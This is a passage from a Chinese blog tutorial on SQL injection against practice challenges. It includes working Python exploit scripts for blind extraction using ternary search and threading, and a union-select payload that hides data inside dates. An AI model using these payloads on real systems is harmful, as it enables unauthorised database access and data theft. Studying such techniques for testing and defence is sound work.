number\">1</span><span class=\"token punctuation\">:</span><br>          result <span class=\"token operator\">+=</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><br>          <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>執行的結果如圖：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p3.png\" alt=\"\"></p>\n<p>跑了 45 秒，比剛剛的做法又快了一倍。</p>\n<h3 id=\"%E6%9C%80%E5%BE%8C%E7%9A%84%E5%8A%A0%E9%80%9F%EF%BC%9A%E5%A4%9A%E5%9F%B7%E8%A1%8C%E7%B7%92\"><a class=\"direct-link\" href=\"#%E6%9C%80%E5%BE%8C%E7%9A%84%E5%8A%A0%E9%80%9F%EF%BC%9A%E5%A4%9A%E5%9F%B7%E8%A1%8C%E7%B7%92\">#</a> 最後的加速：多執行緒</h3>\n<p>前面我們都是等一個 request 回來才發下一個，但其實可以用多執行緒同時去發 request，例如說每一個 thread 固定去猜一個位置的值，速度應該能快上不少。</p>\n<p>雖然需要嘗試的次數是一樣的，但每秒嘗試的次數變多了，所以整體秒數自然也變少了。</p>\n<p>底下是簡單實作的程式碼，需要先知道最後字串的長度，要再做精緻一點就是先搜出要撈的資料長度，然後再去撈資料本身：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-search-thread.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> time<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> concurrent<span class=\"token punctuation\">.</span>futures<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">print_success</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[92m</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>raw<span class=\"token punctuation\">}</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>char_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>char_set <span class=\"token operator\">=</span> <span class=\"token string\">'}abcdefghijklmnopqrstuvwxyz_'</span><br>flag <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics{'</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">get_char</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  L <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>  R <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>char_set<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><br>  prefix <span class=\"token operator\">=</span> flag <span class=\"token operator\">+</span> <span class=\"token string\">\"_\"</span> <span class=\"token operator\">*</span> index<br>  <span class=\"token keyword\">while</span> L<span class=\"token operator\">&lt;=</span>R<span class=\"token punctuation\">:</span><br>    s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R<span class=\"token operator\">-</span>L<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">3</span><br>    ML <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> s<br>    MR <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> s <span class=\"token operator\">*</span> <span class=\"token number\">2</span><br>    <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      MR <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> <span class=\"token number\">1</span><br><br>    group <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><br>      char_set<span class=\"token punctuation\">[</span>L<span class=\"token punctuation\">:</span>ML<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>      char_set<span class=\"token punctuation\">[</span>ML<span class=\"token punctuation\">:</span>MR<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>      char_set<span class=\"token punctuation\">[</span>MR<span class=\"token punctuation\">:</span>R<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><br>    <span class=\"token punctuation\">]</span><br><br>    conditions <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        conditions<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\"1=2\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">continue</span><br>      arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"(content like '</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>prefix<span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">92</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> c <span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token string\">'_'</span> <span class=\"token keyword\">else</span> c<span class=\"token punctuation\">}</span></span><span class=\"token string\">%')\"</span></span> <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> group<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><br>      conditions<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\" or \"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>    (select case<br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 1  <br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 2  <br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 5<br>      else 10<br>    end from flag)<br>    '''</span></span><br><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"For </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\"> trying\"</span></span><span class=\"token punctuation\">,</span> group<span class=\"token punctuation\">)</span><br><br>    response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/search.php?tag=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><br><br>    data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><br>      R <span class=\"token operator\">=</span> ML<br>      <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">return</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><br>      <br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"home1\"</span><span class=\"token punctuation\">:</span><br>        L <span class=\"token operator\">=</span> ML<br>        R <span class=\"token operator\">=</span> MR<br>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><br>          <span class=\"token keyword\">return</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><br>      <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>        L <span class=\"token operator\">=</span> MR<br>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><br>          <span class=\"token keyword\">return</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    length <span class=\"token operator\">=</span> <span class=\"token number\">15</span><br>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> length<br>    <span class=\"token keyword\">with</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>ThreadPoolExecutor<span class=\"token punctuation\">(</span>max_workers<span class=\"token operator\">=</span>length<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> executor<span class=\"token punctuation\">:</span><br>        futures <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>executor<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>get_char<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">for</span> future <span class=\"token keyword\">in</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>as_completed<span class=\"token punctuation\">(</span>futures<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>            index <span class=\"token operator\">=</span> futures<span class=\"token punctuation\">[</span>future<span class=\"token punctuation\">]</span><br>            data <span class=\"token operator\">=</span> future<span class=\"token punctuation\">.</span>result<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>            print_success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Index </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>data<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span><br>            ans<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<br><br>    print_success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"flag: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>flag<span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>n <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> ans <span class=\"token keyword\">if</span> n <span class=\"token operator\">!=</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span><br><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>跑起來像這樣：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p4.png\" alt=\"\"></p>\n<p>我們開了 15 個 thread，時間從 45 秒降低成 3 秒，利用多執行緒讓整體速度提升了 15 倍。</p>\n<p>總結一下，在 SQL 方面，我們可以利用三分搜來降低嘗試次數，在 SQL 方面這已經是我能想到最快的方法了，如果還有更快的，請在底下留言告訴我。</p>\n<p>在程式方面，則是可以用多執行緒同時發出多個 request，來加快嘗試的速度，跟 SQL 的最佳化互相搭配之後就能大幅降低秒數。</p>\n<h2 id=\"%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E8%A8%82%E6%88%BF%E6%9F%A5%E8%A9%A2%E5%8A%9F%E8%83%BD\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E8%A8%82%E6%88%BF%E6%9F%A5%E8%A9%A2%E5%8A%9F%E8%83%BD\">#</a> 案例二：訂房查詢功能</h2>\n<p>這個挑戰是訂房查詢的功能，會傳入三個參數：</p>\n<ol>\n<li>id</li>\n<li>start_time</li>\n<li>end_time</li>\n</ol>\n<p>接著系統會去查詢一張叫做 price 的 table，找出符合條件的資料，就代表那一天有設定價格，所以可以訂房，而回傳的資料中會根據 start_time 跟 end_time，回傳這之中的每一天是否可以訂房，可以的話就顯示 Available，否之則顯示 Unavailable。</p>\n<p>這題的注入點在 <code>id</code>，因為 <code>id</code> 沒有被 escape，所以可以執行 SQL injection，我們先來看一下這題的程式碼：</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$startTime</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$endTime</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtotime</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+1 day'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token variable\">$found</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$priceItems</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'results'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$range</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$range</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"start_time\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$range</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"end_time\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$range</span><span class=\"token punctuation\">;</span><br>            <span class=\"token variable\">$found</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$found</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token variable\">$events</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><br>          <span class=\"token string single-quoted-string\">'start'</span> <span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"start_time\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>          <span class=\"token string single-quoted-string\">'end'</span> <span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"end_time\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>          <span class=\"token string single-quoted-string\">'status'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"Available\"</span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token variable\">$events</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><br>          <span class=\"token string single-quoted-string\">'start'</span> <span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>          <span class=\"token string single-quoted-string\">'end'</span> <span class=\"token operator\">=></span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>          <span class=\"token string single-quoted-string\">'status'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"Unavailable\"</span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span>   <br><span class=\"token punctuation\">}</span></code></pre>\n<p>如同前面提到的，這題會從傳入的 start_time 開始一天一天加，加到 end_time 為止，而這之中的每一天會去 <code>priceItems</code> 裡面查，看有沒有符合區間的資料，有找到的話就會把那天的 status 設成 Available，反之則是 Unavailable。</p>\n<p>底下則是撈出 price items 資料的程式碼，query 的部分為了方便閱讀我有改了一下排版：</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getPriceItems</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$start</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$end</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">global</span> <span class=\"token variable\">$conn</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token function\">esc_sql</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token variable\">$end</span> <span class=\"token operator\">=</span> <span class=\"token function\">esc_sql</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$end</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"<br>    select * from price where (<br>        (price.start_time >= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">}</span></span> AND price.end_time &lt;= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$end</span><span class=\"token punctuation\">}</span></span>)<br>          OR (price.start_time &lt;= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">}</span></span> AND price.end_time >= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$start</span><span class=\"token punctuation\">}</span></span>)<br>          OR (price.start_time &lt;= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$end</span><span class=\"token punctuation\">}</span></span> AND price.end_time >= <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$end</span><span class=\"token punctuation\">}</span></span>)<br>        ) AND price.home_id = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span><br>    <br>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><br>        <span class=\"token string single-quoted-string\">'results'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$arr</span><br>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><span class=\"token operator\">?</span><span class=\"token operator\">></span></code></pre>\n<p>在 id 的地方我們可以用 <code>union</code> 的方式來讓 price items 變成我們指定的資料，由於 <code>union</code> 需要知道有幾個欄位，因此可以先用 <code>order by {number}</code> 的方式去看看有幾個欄位，例如說 <code>order by 2</code>，代表用第二個欄位來排序，如果不足第二個就會出錯，所以我們可以用類似二分搜的方法知道有幾個欄位，嘗試過後發現一共是 4 個欄位。</p>\n<p>接著，<code>2023-01-01</code> 換成 timestamp 是 1672502400，因此我們的 id 可以長這樣：</p>\n<pre><code>0 union select 1672502400,1672502400,1672502400,1672502400\n</code></pre>\n<p>會發現回傳的資料中，status 變成 Available，代表我們的 SQL injection 成功了，再來就是要去試哪一個欄位是 start_time，哪一個又是 end_time，可以把每個欄位都變成 1，看看回傳結果會不會改變，就知道有沒有動到這兩個欄位。</p>\n<p>總之呢，一波嘗試過後發現第二個欄位是 start_time，第三個是 end_time。</p>\n<p>那我們可以怎麼利用呢？一個簡單的做法是像上一題一樣，用 case when 來做事，例如說某條件符合時就 select 出指定的資料（狀態會變 Available），不符合則否（狀態會是 Unavailable），一樣可以慢慢把資料弄出來。</p>\n<p>不過這題跟上一題有個很大的不同點，那就是這一題我們可以控制輸出資料中的 start_time 跟 end_time，雖然這兩個值一定要是日期，但我們可以把想回傳的資料偷渡在日期裡面。</p>\n<p>我的做法就是這樣，簡單來說就是把想回傳的資料變成一個日期。</p>\n<p>我們可以先拿到資料中的第 n 個字元，假設轉成 ascii 之後會是 x，我們可以把這個視為「x 天」的意思，我們把 <code>x*3600*24</code> 再加上 <code>2023-01-01</code> 的 timestamp 1672502400，就會得到一個新的 timestamp 做為 end_time，並且在 php 被轉成日期。</p>\n<p>而我們從 response 中拿到這個日期以後，只要算出從 <code>2023-01-01</code> 過了幾天即可，因此把日期先轉回 timestamp，再減去 1672502400 以後除以 86400(<code>3600*24</code>)，就會得到這個天數，假設是 98 天好了，就代表當初讀到的字元是 chr(98) 也就是 b，就得到了一個字元。</p>\n<p>因此，藉由把 ascii code 偷渡在日期中，每做一次操作我們可以拿到一個字元的資料，程式碼如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-ava.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> time<br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>base_time <span class=\"token operator\">=</span> <span class=\"token number\">1672502400</span><br>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br>field <span class=\"token operator\">=</span> <span class=\"token string\">'group_concat(table_name)'</span><br>fr <span 